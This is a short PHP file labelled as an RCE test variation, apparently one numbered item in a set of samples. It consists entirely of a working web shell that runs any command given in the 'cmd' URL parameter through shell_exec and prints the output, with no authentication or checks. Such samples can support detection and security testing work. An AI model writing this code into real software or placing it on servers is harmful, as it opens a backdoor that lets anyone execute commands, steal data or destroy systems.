<?php
// RCE test variation #617
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>